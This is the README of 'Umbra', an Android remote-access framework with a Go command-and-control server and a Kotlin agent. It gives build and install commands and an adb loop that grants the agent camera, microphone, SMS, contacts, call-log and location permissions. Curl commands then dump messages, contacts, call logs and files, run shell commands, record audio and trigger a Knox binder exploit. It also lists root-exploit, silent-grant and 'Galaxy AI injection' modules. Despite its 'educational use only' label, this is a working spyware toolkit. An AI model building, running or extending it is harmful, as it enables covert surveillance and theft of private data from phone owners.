# Umbra — Android Red Team Framework

[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)

> GoFrame C2 server + Kotlin Android agent. Knox binder exploitation. Galaxy AI injection. Educational use only.

---

## Quick Commands (Copy-Paste)

```bash
# BUILD SERVER
cd ~/UMBRA/Umbra-Server/umbra-c2/app/umbra-c2
export PATH="$HOME/go/bin:$HOME/go-projects/bin:$PATH"
go build -o /tmp/umbra-server .

# BUILD APK
cd ~/UMBRA/Umbra-Client
export JAVA_HOME="$HOME/.local/share/JetBrains/Toolbox/apps/android-studio/jbr"
./gradlew clean assembleDebug

# INSTALL
adb install app/build/outputs/apk/debug/app-debug.apk

# GRANT PERMISSIONS
for p in CAMERA ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION RECORD_AUDIO \
         READ_MEDIA_IMAGES READ_SMS READ_CONTACTS READ_CALL_LOG \
         READ_PHONE_STATE POST_NOTIFICATIONS; do
    adb shell pm grant org.umbra.core android.permission.$p
done

# LAUNCH
adb shell am start -n org.umbra.core/.MainActivity

# START SERVER (keep open)
fuser -k 8443/tcp 2>/dev/null
/tmp/umbra-server

# UNINSTALL
adb uninstall org.umbra.core

# DASHBOARD
# Open: https://YOUR_SERVER_IP:8443
# Find your IP: hostname -I   (first address, e.g. 192.168.x.x)
# Open in incognito, Ctrl+Shift+R
```

## Find Your Server IP

The dashboard URL uses **your machine's LAN IP**, not a fixed address. To find it:

```bash
hostname -I
# Output example: 192.168.1.5 172.17.0.1
# Use the FIRST address (192.168.1.5 in this example)

# Then open:
# https://192.168.1.5:8443
```

The agent APK connects to this same IP. If your IP changes (moving networks, VPN), rebuild the APK with the new IP in `SynapseEngine.kt` (`DEFAULT_C2` constant) or set it via ADB:

```bash
adb shell "echo 'wss://YOUR_IP:8443/c2' > /data/data/org.umbra.core/shared_prefs/umbra_c2_url"
adb shell am force-stop org.umbra.core
adb shell am start -n org.umbra.core/.MainActivity
```

---

## Test Commands

```bash
URL="https://localhost:8443"
ID="a2a99ec51033f84f"

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'"$ID"'","module":"sms","action":"list","params":{"count":"3"}}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'"$ID"'","module":"contacts","action":"list","params":{"count":"3"}}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'"$ID"'","module":"calls","action":"list","params":{"count":"3"}}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'"$ID"'","module":"files","action":"list","params":{"type":"images","count":"5"}}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'"$ID"'","module":"shell","action":"exec","params":{"cmd":"id; uname -a"}}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'"$ID"'","module":"mic","action":"record","params":{"duration":"5"}}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'"$ID"'","module":"knox","action":"shell_exploit"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'"$ID"'","module":"root","action":"check"}'

curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
  -d '{"device_id":"'"$ID"'","module":"live","action":"start"}'
```

---

## Modules

| # | Module | Actions | Status |
|---|--------|---------|--------|
| 1 | SMS | list, dump, send, capture | ✓ (with ADB pm grant) |
| 2 | Calls | list | ✓ |
| 3 | Contacts | list | ✓ |
| 4 | Files | list, read | ✓ |
| 5 | Shell | exec | ✓ |
| 6 | Location | get | ~ GPS off = timeout |
| 7 | Mic | record, stop | ✓ AAC audio |
| 8 | Camera | capture, screenshot | ✗ Knox HAL blocked |
| 9 | Info | gather | ✓ |
| 10 | SilentGrant | grant | ✗ Android 16 blocks all 14 techniques |
| 11 | Knox | grant, enumerate, shell_exploit | ✓ binder accessible, enterprise_policy tx=1 works |
| 12 | AiInject | inject, status | ✓ Honeyboard detected |
| 13 | Live | start, stop, status | ✓ push monitoring |
| 14 | Root | check, exploit, daemonize | ✓ checks, no root yet |
| 15 | Ping | ping | ✓ |

---

## API

| Method | Path | Description |
|--------|------|-------------|
| GET | /api/health | Server health + device count |
| GET | /api/devices | Registered devices |
| POST | /api/command | Queue command |
| GET | /api/events | SSE result stream |
| GET | /c2 | WebSocket |

Command format: `{"device_id":"...","module":"sms","action":"list","params":{"count":"5"}}`

---

## Architecture

```
Android Agent (Kotlin) ← WSS:AES-256-GCM → GoFrame C2 (Go) → Dashboard (HTML/JS)
    15 modules                              :8443                  auto-select + SSE
    Knox binder exploit                     REST API               11 action buttons
```

---

## Environment

| Component | Value |
|-----------|-------|
| Device | Samsung Galaxy A35 (SM-A356B) |
| Android | 16 (SDK 36), One UI 8.5 |
| Kernel | 6.6.98, patch July 2026 |
| SoC | Exynos 1380 (s5e8835) |
| Server | Go 1.21+, GoFrame v2 |
| Agent | Kotlin, Gradle 8.x |
| Dashboard | Vanilla JS, SSE |

---

## Known Limitations

- **Permissions** — Android 16 Samsung blocks all silent grant techniques from untrusted_app. Requires ADB `pm grant` or root exploit.
- **Camera** — Knox HAL blocks Camera2 API (`CAMERA_DISABLED by policy`). misc_policy binder may unlock it.
- **Screenshot** — SELinux blocks screencap for untrusted_app. Requires shell UID or root.
- **Location** — Timeout if GPS is off. Network fallback partially works.

---

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| Agent offline | `adb shell am force-stop org.umbra.core && adb shell am start -n org.umbra.core/.MainActivity` |
| Dashboard empty | Open incognito, Ctrl+Shift+R |
| permission_denied | Run `pm grant` loop after install |
| Server crash | Rebuild: `go build -o /tmp/umbra-server .` |
| APK not updating | `./gradlew clean assembleDebug` not `assembleDebug` |
